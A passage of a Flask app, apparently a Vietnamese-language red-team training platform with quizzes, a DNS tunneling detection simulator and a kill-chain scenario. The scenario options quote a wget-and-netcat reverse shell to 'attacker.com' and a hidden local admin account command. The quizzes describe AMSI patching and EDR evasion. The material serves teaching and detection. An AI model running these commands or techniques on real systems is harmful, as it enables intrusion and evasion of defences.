                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.8)
                conn_result = sock.connect_ex((target_host, port))
                sock.close()
                status = 'OPEN' if conn_result == 0 else 'BLOCKED'
            except Exception:
                status = 'ERROR'
            results.append({'port': port, 'status': status})

        # Log nếu egress test nhắm vào CTF target
        ctf_host = os.environ.get('TARGET_URL', '').replace('http://', '').replace('https://', '').split('/')[0].split(':')[0]
        if ctf_host and ctf_host in target_host:
            open_p = [r['port'] for r in results if r['status'] == 'OPEN']
            log_target_request('Egress Test', target_host, f"{len(open_p)} open: {open_p}")

    return render_template('egress_test.html', results=results, target_host=target_host)


# ==========================================
# 7. KHỞI TẠO DATABASE
# ==========================================

def seed_knowledge_base():
    if QuizQuestion.query.count() == 0:
        questions = [
            # 1. Kill Chain
            QuizQuestion(
                category='kill_chain',
                question='Giai đoạn nào trong Cyber Kill Chain tập trung vào thu thập thông tin nguồn mở (OSINT) và quét mạng để lập bản đồ bề mặt tấn công?',
                options=json.dumps(['Reconnaissance (Trinh sát)', 'Weaponization (Vũ khí hóa)', 'Exploitation (Khai thác)', 'Actions on Objectives (Đạt mục tiêu)'], ensure_ascii=False),
                correct_index=0,
                explanation='Reconnaissance (Trinh sát) là bước đầu tiên trong chuỗi tấn công nhằm tìm hiểu kỹ mục tiêu (OSINT, DNS, port scanning) trước khi gửi payload.'
            ),
            QuizQuestion(
                category='kill_chain',
                question='Kỹ thuật duy trì hiện diện (Persistence) nào sau đây hoạt động bằng cách ghi giá trị vào Registry để tự kích hoạt cùng phiên đăng nhập người dùng Windows?',
                options=json.dumps(['Pass-the-Hash', 'Registry Run Keys (HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run)', 'DNS Tunneling', 'Direct Syscalls'], ensure_ascii=False),
                correct_index=1,
                explanation='Registry Run Keys (HKCU hoặc HKLM ...\\CurrentVersion\\Run) là kỹ thuật persistence kinh điển, tự động chạy payload khi người dùng đăng nhập.'
            ),
            QuizQuestion(
                category='kill_chain',
                question='Kỹ thuật nào cho phép Red Team di chuyển lén lút giữa các máy chủ Windows trong mạng nội bộ mà không cần bẻ khóa mật khẩu văn bản thô (plaintext)?',
                options=json.dumps(['Pass-the-Hash (sử dụng trực tiếp NTLM hash)', 'DHCP Starvation', 'SQL Injection', 'Deconfliction'], ensure_ascii=False),
                correct_index=0,
                explanation='Pass-the-Hash (PtH) cho phép xác thực NTLM với dịch vụ từ xa (SMB, WMI) bằng hash mật khẩu trích xuất được từ bộ nhớ mà không cần giải mã mật khẩu gốc.'
            ),
            QuizQuestion(
                category='kill_chain',
                question='Mục đích chính của việc sử dụng DNS Tunneling trong giai đoạn C&C (Command & Control) là gì?',
                options=json.dumps(['Gây tràn bộ nhớ máy chủ DNS nội bộ', 'Tuồn dữ liệu hoặc duy trì kênh chỉ huy lách qua tường lửa egress chỉ cho phép cổng 53', 'Tăng tốc độ truyền tệp tin lớn trong LAN', 'Tự động cấp phát địa chỉ IP'], ensure_ascii=False),
                correct_index=1,
                explanation='Đa số tường lửa cho phép lưu lượng DNS (cổng 53 UDP) đi ra ngoài. DNS Tunneling mã hóa payload vào tên miền con (subdomain) để tạo kênh C2 bí mật.'
            ),

            # 2. Windows Internals
            QuizQuestion(
                category='windows_internals',
                question='Trong kiến trúc Windows, luồng gọi API nào sau đây thể hiện đúng thứ tự từ ứng dụng User Mode xuống Kernel Mode?',
                options=json.dumps(['Application → kernel32.dll → ntdll.dll → Syscall → Kernel (ntoskrnl.exe)', 'Application → Kernel → ntdll.dll → kernel32.dll', 'Application → Syscall → kernel32.dll → ntdll.dll', 'Application → ntdll.dll → PEB → Kernel'], ensure_ascii=False),
                correct_index=0,
                explanation='Ứng dụng gọi API cấp cao tại kernel32.dll, thư viện này chuyển tiếp sang Native API tại ntdll.dll, ntdll nạp syscall ID và gọi lệnh syscall để chuyển quyền xuống Ring 0 (ntoskrnl.exe).'
            ),
            QuizQuestion(
                category='windows_internals',
                question='Kỹ thuật Process Injection kinh điển vào tiến trình hợp lệ (như explorer.exe) sử dụng chuỗi 3 API nào theo đúng trình tự?',
                options=json.dumps(['VirtualAllocEx → WriteProcessMemory → CreateRemoteThread', 'OpenProcess → TerminateProcess → DeleteFile', 'CreateFile → ReadFile → CloseHandle', 'AmsiScanBuffer → LoadLibrary → GetProcAddress'], ensure_ascii=False),
                correct_index=0,
                explanation='VirtualAllocEx cấp phát vùng nhớ trong tiến trình đích, WriteProcessMemory ghi shellcode vào đó, và CreateRemoteThread khởi tạo luồng thực thi shellcode.'
            ),
            QuizQuestion(
                category='windows_internals',
                question='Cơ chế nào thường được Red Team nghiên cứu để vượt qua sự giám sát User-mode Hooking của EDR trên ntdll.dll?',
                options=json.dumps(['Chạy script dưới quyền Guest', 'Direct Syscalls (gọi lệnh syscall trực tiếp lách qua hook ntdll)', 'Tắt tường lửa Windows Defender', 'Đổi đuôi file sang .txt'], ensure_ascii=False),
                correct_index=1,
                explanation='EDR thường cài đặt inline hook tại ntdll.dll ở User Mode. Direct Syscalls nạp mã syscall trực tiếp vào thanh ghi EAX và gọi lệnh syscall, không đi qua các hàm bị hook trong ntdll.'
            ),
            QuizQuestion(
                category='windows_internals',
                question='Để lách qua cơ chế kiểm tra mã độc của AMSI (Antimalware Scan Interface) trong bộ nhớ tiến trình PowerShell, kỹ thuật phổ biến là gì?',
                options=json.dumps(['Khởi động lại máy chủ', 'Patch byte hàm AmsiScanBuffer trong bộ nhớ để luôn trả về kết quả an toàn (0)', 'Xóa file powershell.exe', 'Tăng dung lượng RAM'], ensure_ascii=False),
                correct_index=1,
                explanation='Kỹ thuật in-memory patch hàm AmsiScanBuffer ghi đè vài byte đầu tiên (như xor eax, eax; ret) để hàm luôn trả về mã thành công và báo script sạch.'
            ),

            # 3. AD & Network Services
            QuizQuestion(
                category='ad_network',
                question='Quy trình cấp phát địa chỉ IP động của giao thức DHCP diễn ra theo trình tự 4 bước nào (DORA)?',
                options=json.dumps(['Discover → Offer → Request → Acknowledge', 'Direct → Open → Receive → Accept', 'Download → Operate → Release → Allocate', 'Detect → Order → Register → Authorize'], ensure_ascii=False),
                correct_index=0,
                explanation='DHCP DORA: 1. Discover (Client broadcast tìm DHCP), 2. Offer (Server đề xuất IP), 3. Request (Client xin nhận IP), 4. Acknowledge (Server xác nhận cấp phát).'
            ),
            QuizQuestion(
                category='ad_network',
                question='Tính năng bảo mật trên Switch Layer 2 giúp ngăn chặn tấn công máy chủ DHCP giả mạo (Rogue DHCP) được gọi là gì?',
                options=json.dumps(['Port Security', 'DHCP Snooping', 'VLAN Tagging', 'DNSSEC'], ensure_ascii=False),
                correct_index=1,
                explanation='DHCP Snooping phân loại cổng Switch thành Trusted (chỉ cổng nối DHCP server hợp lệ mới được gửi Offer/ACK) và Untrusted (chặn gói tin cấp phát IP giả mạo).'
            ),
            QuizQuestion(
                category='ad_network',
                question='Tệp tin cơ sở dữ liệu nào trong Active Directory lưu trữ toàn bộ thông tin tài khoản, nhóm và NTLM password hashes của domain?',
                options=json.dumps(['sam.bak', 'ntds.dit', 'active_directory.db', 'kerberos.keytab'], ensure_ascii=False),
                correct_index=1,
                explanation='ntds.dit là cơ sở dữ liệu chính của Active Directory Domain Services, chứa toàn bộ thông tin người dùng và hash mật khẩu miền.'
            ),
            QuizQuestion(
                category='ad_network',
                question='Để thực hiện kỹ thuật Pivoting (bắc cầu mạng) xuyên qua firewall từ máy chủ DMZ bị chiếm quyền vào mạng nội bộ, giao thức tầng 5 nào thường được kết hợp với Chisel/Ligolo-ng và Proxychains?',
                options=json.dumps(['SOCKS5 (port 1080)', 'FTP (port 21)', 'SNMP (port 161)', 'POP3 (port 110)'], ensure_ascii=False),
                correct_index=0,
                explanation='SOCKS5 hoạt động ở tầng Session (Layer 5), cho phép chuyển tiếp lưu lượng TCP/UDP tùy ý thông qua tunnel, kết hợp Proxychains để pivot sâu vào mạng nội bộ.'
            )
        ]
        db.session.add_all(questions)
        db.session.commit()
        print('>>> Seeded QuizQuestions successfully.')


# ==========================================
# MODULE 1: KNOWLEDGE BASE & QUIZ
# ==========================================
@app.route('/knowledge_base')
@login_required
def knowledge_base():
    seed_knowledge_base()
    questions = QuizQuestion.query.all()
    categorized = {
        'kill_chain': [q for q in questions if q.category == 'kill_chain'],
        'windows_internals': [q for q in questions if q.category == 'windows_internals'],
        'ad_network': [q for q in questions if q.category == 'ad_network']
    }
    
    solved_ids = {p.question_id for p in QuizProgress.query.filter_by(user_id=current_user.id, correct=True).all()}
    
    for cat in categorized:
        for q in categorized[cat]:
            try:
                q.parsed_options = json.loads(q.options)
            except Exception:
                q.parsed_options = []
                
    return render_template('knowledge_base.html', categorized=categorized, solved_ids=solved_ids)

@app.route('/knowledge_base/submit', methods=['POST'])
@login_required
def submit_quiz():
    data = request.get_json(silent=True) or request.form
    question_id = data.get('question_id')
    chosen_index = data.get('chosen_index')
    
    if question_id is None or chosen_index is None:
        return jsonify({'status': 'error', 'message': 'Thiếu dữ liệu câu hỏi hoặc đáp án.'}), 400
        
    try:
        qid = int(question_id)
        c_idx = int(chosen_index)
    except ValueError:
        return jsonify({'status': 'error', 'message': 'Dữ liệu không hợp lệ.'}), 400
        
    question = db.session.get(QuizQuestion, qid)
    if not question:
        return jsonify({'status': 'error', 'message': 'Không tìm thấy câu hỏi.'}), 404
        
    existing_progress = QuizProgress.query.filter_by(user_id=current_user.id, question_id=qid, correct=True).first()
    is_correct = (c_idx == question.correct_index)
    points_awarded = 0
    
    if is_correct:
        if not existing_progress:
            progress = QuizProgress(user_id=current_user.id, question_id=qid, correct=True)
            db.session.add(progress)
            current_user.score += 10
            points_awarded = 10
            log_action(f'Quiz: {question.category}')
            db.session.commit()
        return jsonify({
            'status': 'success',
            'correct': True,
            'points_awarded': points_awarded,
            'new_score': current_user.score,
            'explanation': question.explanation,
            'already_solved': bool(existing_progress)
        })
    else:
        return jsonify({
            'status': 'success',
            'correct': False,
            'explanation': 'Chưa chính xác. Hãy đọc lại phần lý thuyết tương ứng ở trên và thử lại!'
        })


# ==========================================
# MODULE 2: NETWORK SIMULATOR (DHCP, DNS, SOCKS5)
# ==========================================
DNS_LOG_SAMPLES = [
    {"id": 0, "time": "14:20:01", "client": "10.0.1.45", "query": "www.google.com", "qtype": "A", "size": 48, "entropy": 2.1, "suspicious": False},
    {"id": 1, "time": "14:20:03", "client": "10.0.1.12", "query": "api.github.com", "qtype": "A", "size": 52, "entropy": 2.4, "suspicious": False},
    {"id": 2, "time": "14:20:06", "client": "10.0.1.88", "query": "update.microsoft.com", "qtype": "A", "size": 56, "entropy": 2.3, "suspicious": False},
    {"id": 3, "time": "14:20:09", "client": "10.0.1.99", "query": "a8f93bc41029e8c71d.c2-exfil.dnstunnel.darkops.net", "qtype": "TXT", "size": 214, "entropy": 4.85, "suspicious": True},
    {"id": 4, "time": "14:20:12", "client": "10.0.1.45", "query": "connectivitycheck.gstatic.com", "qtype": "A", "size": 44, "entropy": 2.2, "suspicious": False},
    {"id": 5, "time": "14:20:15", "client": "10.0.1.20", "query": "login.live.com", "qtype": "A", "size": 60, "entropy": 2.5, "suspicious": False},
    {"id": 6, "time": "14:20:18", "client": "10.0.1.33", "query": "cdn.cloudflare.net", "qtype": "A", "size": 50, "entropy": 2.3, "suspicious": False},
    {"id": 7, "time": "14:20:21", "client": "10.0.1.15", "query": "s3.amazonaws.com", "qtype": "A", "size": 54, "entropy": 2.4, "suspicious": False},
    {"id": 8, "time": "14:20:25", "client": "10.0.1.77", "query": "static.xx.fbcdn.net", "qtype": "A", "size": 58, "entropy": 2.6, "suspicious": False},
    {"id": 9, "time": "14:20:29", "client": "10.0.1.99", "query": "aHR0cHM6Ly9hdHRhY2tlci5jb20vcGF5bG9hZA.cmd.beacon-sync.xyz", "qtype": "TXT", "size": 248, "entropy": 4.92, "suspicious": True},
    {"id": 10, "time": "14:20:33", "client": "10.0.1.18", "query": "office.com", "qtype": "A", "size": 42, "entropy": 2.0, "suspicious": False},
    {"id": 11, "time": "14:20:36", "client": "10.0.1.52", "query": "slack.com", "qtype": "A", "size": 46, "entropy": 2.1, "suspicious": False},
    {"id": 12, "time": "14:20:40", "client": "10.0.1.61", "query": "dns.google", "qtype": "A", "size": 40, "entropy": 1.9, "suspicious": False},
    {"id": 13, "time": "14:20:44", "client": "10.0.1.22", "query": "t.co", "qtype": "A", "size": 38, "entropy": 1.8, "suspicious": False},
    {"id": 14, "time": "14:20:48", "client": "10.0.1.80", "query": "mail.google.com", "qtype": "A", "size": 52, "entropy": 2.3, "suspicious": False},
    {"id": 15, "time": "14:20:52", "client": "10.0.1.99", "query": "stage2-chunk04-enc-payload-7718aa.data-pipe.exfil.org", "qtype": "TXT", "size": 198, "entropy": 4.78, "suspicious": True},
    {"id": 16, "time": "14:20:56", "client": "10.0.1.11", "query": "zoom.us", "qtype": "A", "size": 44, "entropy": 2.1, "suspicious": False},
    {"id": 17, "time": "14:21:00", "client": "10.0.1.34", "query": "wikipedia.org", "qtype": "A", "size": 48, "entropy": 2.2, "suspicious": False}
]

DHCP_PACKETS = {
    1: """[GÓI TIN 1: DHCP DISCOVER]
Frame 1: 342 bytes on wire
Ethernet II, Src: 00:0c:29:1a:2b:3c (Client_VM), Dst: ff:ff:ff:ff:ff:ff (Broadcast)
Internet Protocol Version 4, Src: 0.0.0.0, Dst: 255.255.255.255
User Datagram Protocol, Src Port: 68 (bootpc), Dst Port: 67 (bootps)
Bootstrap Protocol (DHCP Discover)
    Message type: Boot Request (1)
    Hardware type: Ethernet (0x01)
    Client MAC address: 00:0c:29:1a:2b:3c
    Client IP address: 0.0.0.0 (Chưa có IP)
    Your (client) IP address: 0.0.0.0
    Option 53: DHCP Discover
    Option 55: Parameter Request List (Subnet Mask, Router, DNS Server)
    Ghi chú: Client phát sóng broadcast trên toàn LAN tìm kiếm bất kỳ máy chủ DHCP nào khả dụng.""",

    2: """[GÓI TIN 2: DHCP OFFER]
Frame 2: 342 bytes on wire
Ethernet II, Src: 00:50:56:c0:00:08 (DHCP_Server), Dst: 00:0c:29:1a:2b:3c (Client_VM)
Internet Protocol Version 4, Src: 192.168.1.1, Dst: 192.168.1.105
User Datagram Protocol, Src Port: 67 (bootps), Dst Port: 68 (bootpc)
Bootstrap Protocol (DHCP Offer)
    Message type: Boot Reply (2)
    Server IP address: 192.168.1.1
    Your (client) IP address: 192.168.1.105 (Đề xuất gán địa chỉ này)
    Option 53: DHCP Offer
    Option 1: Subnet Mask (255.255.255.0)
    Option 3: Router / Default Gateway (192.168.1.1)
    Option 51: IP Address Lease Time (86400s - 24 giờ)
    Option 54: DHCP Server Identifier (192.168.1.1)
    Ghi chú: Server hợp lệ gửi đề xuất IP kèm thông số Gateway và thời hạn thuê (Lease).""",

    3: """[GÓI TIN 3: DHCP REQUEST]
Frame 3: 342 bytes on wire
Ethernet II, Src: 00:0c:29:1a:2b:3c (Client_VM), Dst: ff:ff:ff:ff:ff:ff (Broadcast)
Internet Protocol Version 4, Src: 0.0.0.0, Dst: 255.255.255.255
User Datagram Protocol, Src Port: 68 (bootpc), Dst Port: 67 (bootps)
Bootstrap Protocol (DHCP Request)
    Message type: Boot Request (1)
    Client MAC address: 00:0c:29:1a:2b:3c
    Requested IP Address: 192.168.1.105
    Option 54: DHCP Server Identifier (192.168.1.1)
    Option 53: DHCP Request
    Ghi chú: Client phát broadcast xác nhận chọn IP 192.168.1.105 từ Server 192.168.1.1.""",

    4: """[GÓI TIN 4: DHCP ACKNOWLEDGE (ACK)]
Frame 4: 342 bytes on wire
Ethernet II, Src: 00:50:56:c0:00:08 (DHCP_Server), Dst: 00:0c:29:1a:2b:3c (Client_VM)
Internet Protocol Version 4, Src: 192.168.1.1, Dst: 192.168.1.105
User Datagram Protocol, Src Port: 67 (bootps), Dst Port: 68 (bootpc)
Bootstrap Protocol (DHCP ACK)
    Message type: Boot Reply (2)
    Your (client) IP address: 192.168.1.105 (Đã kích hoạt chính thức)
    Option 53: DHCP ACK
    Option 51: Lease Time: 86400s
    Option 6: Domain Name Server: 1.1.1.1, 8.8.8.8
    Option 3: Router: 192.168.1.1
    [TRẠNG THÁI]: Gán địa chỉ IP thành công! Client đã sẵn sàng truyền thông tin."""
}

@app.route('/network_sim')
@login_required
def network_sim():
    return render_template('network_sim.html', dns_logs=DNS_LOG_SAMPLES)

@app.route('/network_sim/dhcp_step', methods=['POST'])
@login_required
def network_sim_dhcp_step():
    data = request.get_json(silent=True) or request.form
    step = int(data.get('step', 1))
    packet = DHCP_PACKETS.get(step, 'Gói tin không tồn tại.')
    return jsonify({'status': 'success', 'step': step, 'packet': packet})

@app.route('/network_sim/check_dhcp_quiz', methods=['POST'])
@login_required
def check_dhcp_quiz():
    data = request.get_json(silent=True) or request.form
    answer_idx = int(data.get('answer_idx', -1))
    # 0: Rogue DHCP server & MitM; 1: Xóa file hệ thống; 2: Đổi mật khẩu BIOS
    if answer_idx == 0:
        current_user.score += 15
        log_action('Completed Network Sim: DHCP DORA & Rogue Defense')
        db.session.commit()
        return jsonify({
            'status': 'success',
            'correct': True,
            'points': 15,
            'new_score': current_user.score,
            'explanation': 'Chính xác! Nếu không có DHCP Snooping trên switch Layer 2, kẻ tấn công có thể dựng Rogue DHCP Server để cấp phát Default Gateway và DNS giả mạo, dẫn hướng lưu lượng nạn nhân qua máy kẻ tấn công nhằm nghe lén và đánh cắp dữ liệu (Man-in-the-Middle).'
        })
    else:
        return jsonify({
            'status': 'success',
            'correct': False,
            'explanation': 'Chưa chính xác. Thiếu DHCP Snooping cho phép kẻ tấn công dựng máy chủ DHCP giả mạo (Rogue DHCP) cấp phát Gateway/DNS độc hại.'
        })

@app.route('/network_sim/check_dns_tunneling', methods=['POST'])
@login_required
def check_dns_tunneling():
    data = request.get_json(silent=True) or request.form
    selected_ids = data.get('selected_ids', [])
    try:
        selected_set = {int(x) for x in selected_ids}
    except Exception:
        selected_set = set()
        
    actual_suspicious = {3, 9, 15}
    if selected_set == actual_suspicious:
        current_user.score += 15
        log_action('Completed Network Sim: DNS Tunneling Detection')
        db.session.commit()
        return jsonify({
            'status': 'success',
            'correct': True,
            'points': 15,
            'new_score': current_user.score,
            'explanation': 'Xuất sắc! Bạn đã nhận diện chính xác 3 dòng DNS Tunneling (ID #3, #9, #15) dựa trên các chỉ dấu then chốt: (1) Độ dài subdomain bất thường (>50 ký tự), (2) Độ ngẫu nhiên Shannon Entropy cao (>4.5, đặc trưng của dữ liệu mã hóa base64/hex), (3) Truy vấn bản ghi TXT với kích thước phản hồi lớn (>190 bytes).'
        })
    else:
        return jsonify({
            'status': 'success',
            'correct': False,
            'explanation': 'Chưa chính xác. Gợi ý: Hãy quan sát các dòng có bản ghi TXT, độ dài subdomain dài bất thường và chỉ số Entropy cao (>4.5). Có chính xác 3 dòng đáng ngờ!'
        })

@app.route('/network_sim/check_socks5_pivot', methods=['POST'])
@login_required
def check_socks5_pivot():
    data = request.get_json(silent=True) or request.form
    route_choice = data.get('route_choice')
    cmd_choice = data.get('cmd_choice')
    
    # Đúng: route_choice == 'dmz_pivot' và cmd_choice == 'proxychains'
    if route_choice == 'dmz_pivot' and cmd_choice == 'proxychains':
        current_user.score += 15
        log_action('Completed Network Sim: SOCKS5 Pivot & Routing')
        db.session.commit()
        return jsonify({
            'status': 'success',
            'correct': True,
            'points': 15,
            'new_score': current_user.score,
            'explanation': 'Chính xác! Attacker không thể kết nối trực tiếp tới Internal-AD do Firewall External DROP. Do đó, Attacker tận dụng máy Compromised-Web (10.0.1.50) trong DMZ làm SOCKS5 proxy server (Chisel/Ligolo), kết hợp lệnh proxychains trên máy Kali để định tuyến lưu lượng xuyên qua tunnel vào thẳng Domain Controller (10.0.3.5).'
        })
    else:
        return jsonify({
            'status': 'success',
            'correct': False,
            'explanation': 'Đường đi hoặc cấu hình chưa đúng. Nhớ rằng Firewall External chặn kết nối trực tiếp từ Internet vào mạng nội bộ; bạn phải bắc cầu (pivot) qua máy DMZ đã chiếm quyền!'
        })


# ==========================================
# MODULE 3: RED TEAM SCENARIO (7-STEP KILL CHAIN)
# ==========================================
def seed_redteam_scenario():
    if Scenario.query.count() == 0:
        sc = Scenario(
            id=1,
            title="Chiến dịch Xâm nhập Doanh nghiệp Fintech (FinSecure Breach)",
            description="Kịch bản mô phỏng 7 giai đoạn Red Team Kill Chain. Người học nhập vai tấn công có kiểm soát, ra quyết định kỹ thuật nhằm đánh giá hệ thống phòng thủ ngân hàng số mà không kích hoạt chuông báo động ngoài phạm vi RoE."
        )
        db.session.add(sc)
        db.session.commit()

        steps_data = [
            {
                "order": 1,
                "name": "Reconnaissance (Trinh sát)",
                "icon": "fa-solid fa-binoculars",
                "objective": "Thu thập thông tin mục tiêu mà không kích hoạt chuông cảnh báo EDR/SIEM của SOC.",
                "situation": "Mục tiêu là Ngân hàng số Fintech FinSecure Corp. Nhiệm vụ của Red Team là tìm điểm xâm nhập ban đầu. Đội ngũ SOC của FinSecure trực 24/7 với hệ thống SIEM/EDR rất nhạy bén. Bạn cần thu thập thông tin về hạ tầng và nhân sự của mục tiêu.",
                "options": [
                    {
                        "id": "A",
                        "title": "OSINT Thụ Động (Passive Recon)",
                        "desc": "Tra cứu chứng chỉ CT Logs (crt.sh), tìm repo GitHub rò rỉ của dev và thu thập email nhân sự qua LinkedIn/Hunter.io.",
                        "is_correct": True,
                        "feedback": "Tuyệt vời! OSINT thụ động hoàn toàn không chạm trực tiếp vào hệ thống phòng thủ của FinSecure, SOC không thể ghi nhận bất kỳ log bất thường nào từ IP của bạn."
                    },
                    {
                        "id": "B",
                        "title": "Quét Cổng Chủ Động Tốc Độ Cao (Active Fast Scan)",
                        "desc": "Dùng Nmap quét toàn bộ dải IP /16 với lệnh `nmap -T5 -A -p-` nhắm vào tất cả máy chủ public.",
                        "is_correct": False,
                        "feedback": "Bị phát hiện ngay! Tùy chọn T5 (Insane) gửi hàng chục ngàn gói tin SYN mỗi giây, hệ thống Firewall/WAF và SIEM của SOC lập tức kích hoạt cảnh báo Port Scan và tự động đưa IP của bạn vào danh sách Block IP."
                    },
                    {
                        "id": "C",
                        "title": "Vishing Giả Danh Cấp Cao Không Căn Cứ",
                        "desc": "Trực tiếp gọi điện thoại giả danh Thống đốc Ngân hàng Nhà nước yêu cầu nhân viên IT đọc mật khẩu quản trị.",
                        "is_correct": False,
                        "feedback": "Thất bại và vi phạm RoE! Kịch bản Vishing thiếu cơ sở khiến nhân viên nghi ngờ và kích hoạt quy trình báo cáo lừa đảo nội bộ ngay lập tức, chiến dịch bị hủy bỏ."
                    }
                ]
            },
            {
                "order": 2,
                "name": "Weaponization & Delivery (Chế tạo vũ khí & Tiếp cận)",
                "icon": "fa-solid fa-envelope-open-text",
                "objective": "Đưa mồi nhử tiếp cận nhân sự mục tiêu vượt qua hệ thống Mail Gateway & Anti-Spam.",
                "situation": "Từ bước trinh sát, bạn phát hiện FinSecure đang tuyển dụng vị trí 'Senior Cloud Security Engineer' và email HR là `hr-recruiting@finsecure.local`. Bạn quyết định sử dụng kênh Phishing nhắm trúng đích (Spear Phishing).",
                "options": [
                    {
                        "id": "A",
                        "title": "Gửi Trực Tiếp Mã Độc Đính Kèm File Nén",
                        "desc": "Gửi email đính kèm file thực thi độc hại `mimikatz.exe` được nén bằng file ZIP không đặt mật khẩu.",
                        "is_correct": False,
                        "feedback": "Bị chặn ngay tại Mail Gateway! Hệ thống Microsoft Defender for Office 365 quét chữ ký mã độc và phát hiện Mimikatz ngay lập tức, email bị cách ly và tài khoản gửi bị gắn cờ độc hại."
                    },
                    {
                        "id": "B",
                        "title": "Spear Phishing Link Tuyển Dụng Dẫn Tới Cổng SSO Giả Mạo",
                        "desc": "Soạn thư ứng tuyển việc làm chuyên nghiệp, đính kèm PDF chứa liên kết dẫn tới trang đăng nhập Single Sign-On (SSO Okta) giả mạo để thu thập thông tin xác thực.",
                        "is_correct": True,
                        "feedback": "Xuất sắc! Email lọt qua bộ lọc thư rác của Gateway, nhân viên HR click vào đường link giả mạo và nhập thông tin tài khoản nội bộ (Username/Password) mà không chút nghi ngờ."
                    },
                    {
                        "id": "C",
                        "title": "Email Đe Dọa Phá Hoại Kèm File Batch",
                        "desc": "Gửi email nặc danh đe dọa đòi HR phải chạy file batch script (.bat) đính kèm.",
                        "is_correct": False,
                        "feedback": "Kém hiệu quả! Email đe dọa thô thiển bị người dùng báo động và chuyển tiếp thẳng vào hòm thư SOC nghi vấn lừa đảo."
                    }
                ]
            },
            {
                "order": 3,
                "name": "Exploitation & Initial Access (Khai thác & Xâm nhập ban đầu)",
                "icon": "fa-solid fa-unlock-keyhole",
                "objective": "Giành quyền thực thi mã lệnh ban đầu trên máy chủ mục tiêu một cách âm thầm.",
                "situation": "Cổng VPN nội bộ yêu cầu khóa cứng FIDO2. Tuy nhiên, qua rà soát hệ thống phụ trợ bên ngoài, bạn phát hiện một cổng Web Portal tuyển dụng phụ đang chạy phiên bản Apache Tomcat cũ tồn tại lỗ hổng RCE đã công bố (1-day).",
                "options": [
                    {
                        "id": "A",
                        "title": "In-Memory Payload HTTPS Reverse Shell",
                        "desc": "Khai thác RCE để inject payload dạng In-Memory, chỉ kết nối HTTPS (port 443) ngược về máy chủ kiểm thử của Red Team theo đúng phạm vi RoE.",
                        "is_correct": True,
                        "feedback": "Chuẩn xác! Lỗ hổng RCE được khai thác thành công, Reverse Shell được thiết lập âm thầm trên cổng 443 (cổng được phép mở ra ngoài mà không bị firewall chặn)."
                    },
                    {
                        "id": "B",
                        "title": "Netcat Shell Rõ Ràng Qua Cổng 4444",
                        "desc": "Chạy lệnh `wget attacker.com/nc && nc -e /bin/sh 4444` không mã hóa qua cổng không chuẩn.",
                        "is_correct": False,
                        "feedback": "Bị EDR phát hiện! Việc tải file từ domain lạ và mở shell trên cổng không chuẩn (4444) lập tức kích hoạt luật cảnh báo 'Suspicious Outbound Connection' của SIEM."
                    },
                    {
                        "id": "C",
                        "title": "Tấn Công Từ Chối Dịch Vụ Crash Server (DoS)",
                        "desc": "Gửi hàng ngàn request làm tràn bộ nhớ nhằm ép máy chủ reboot sang chế độ recovery.",
                        "is_correct": False,
                        "feedback": "Vi phạm nghiêm trọng RoE! Tấn công từ chối dịch vụ làm sập hệ thống dịch vụ doanh nghiệp, vi phạm nguyên tắc an toàn cốt lõi của cuộc kiểm thử Red Team."
                    }
                ]
            },
            {
                "order": 4,
                "name": "Persistence (Thiết lập Duy trì quyền truy cập)",
                "icon": "fa-solid fa-anchor",
                "objective": "Duy trì khả năng truy cập sau khi máy chủ reboot mà không đánh động hệ thống giám sát định danh.",
                "situation": "Bạn đã có quyền shell cục bộ với user dịch vụ `svc_web` trên máy chủ Windows Server 2022 DMZ. Tuy nhiên nếu máy chủ reboot, bạn sẽ mất quyền truy cập. Bạn cần duy trì hiện diện (Persistence).",
                "options": [
                    {
                        "id": "A",
                        "title": "Tạo Tài Khoản Local Admin Mới Công Khai",
                        "desc": "Chạy lệnh `net user hacker_admin Pass123! /add` và `net localgroup administrators hacker_admin /add`.",
                        "is_correct": False,
                        "feedback": "Bị SOC tóm gọn trong 30 giây! Lệnh `net user /add` vào nhóm Administrators kích hoạt Event ID 4720 & 4728 trên Windows Security Log, SIEM bắn alert mức High Severity và tài khoản bị vô hiệu hóa ngay lập tức."
                    },
                    {
                        "id": "B",
                        "title": "Scheduled Task Dưới Dịch Vụ Hợp Lệ Có Jitter Thời Gian",
                        "desc": "Đăng ký Scheduled Task chạy dưới ngữ cảnh dịch vụ hợp lệ hoặc Registry Run Key cấp người dùng với chu kỳ ngẫu nhiên (jitter 20-30%).",
                        "is_correct": True,
                        "feedback": "Rất thông minh! Scheduled Task giả lập tác vụ bảo trì hệ thống định kỳ kết hợp jitter ngẫu nhiên giúp tránh các thuật toán phát hiện beaconing dựa trên chu kỳ cố định của hệ thống phòng thủ."
                    },
                    {
                        "id": "C",
                        "title": "Patch Trực Tiếp File Kernel ntoskrnl.exe",
                        "desc": "Sửa file nhị phân `ntoskrnl.exe` để ép nạp backdoor ngay tại Ring 0 khi Windows khởi động.",
                        "is_correct": False,
                        "feedback": "Gây lỗi màn hình xanh (BSOD)! Cơ chế PatchGuard (Kernel Patch Protection) và Secure Boot của Windows Server lập tức phát hiện kernel bị sửa đổi, khiến hệ thống gặp lỗi BSOD và máy chủ dừng hoạt động."
                    }
                ]
            },
            {
                "order": 5,
                "name": "Command & Control - C2 (Kênh điều khiển & Ra lệnh)",
                "icon": "fa-solid fa-tower-broadcast",
                "objective": "Ẩn giấu lưu lượng điều khiển vào hạ tầng mạng hợp lệ vượt qua SSL Inspection và IDS.",
                "situation": "Bạn cần gửi các lệnh điều khiển từ xa, nhưng FinSecure triển khai Next-Gen Firewall (NGFW) và SSL Inspection rất gắt gao với các kết nối đi ra ngoài.",
                "options": [
                    {
                        "id": "A",
                        "title": "Truyền Thông IRC / HTTP Cleartext Cố Định",
                        "desc": "Mở kết nối IRC thô qua port 6667 hoặc gửi HTTP Cleartext mỗi giây 1 lần về địa chỉ IP lạ không có tên miền.",
                        "is_correct": False,
                        "feedback": "Bị phát hiện lập tức! Kết nối không mã hóa qua cổng lạ và tần suất gọi liên tục không có jitter khiến IPS/IDS phân loại ngay là botnet traffic."
                    },
                    {
                        "id": "B",
                        "title": "Malleable HTTPS C2 Profile Kèm Tên Miền Uy Tín",
                        "desc": "Sử dụng C2 hiện đại (Sliver/Cobalt Strike) mã hóa HTTPS TLS, mô phỏng lưu lượng API SaaS thông thường hoặc dự phòng kênh DNS Tunneling có jitter ngẫu nhiên.",
                        "is_correct": True,
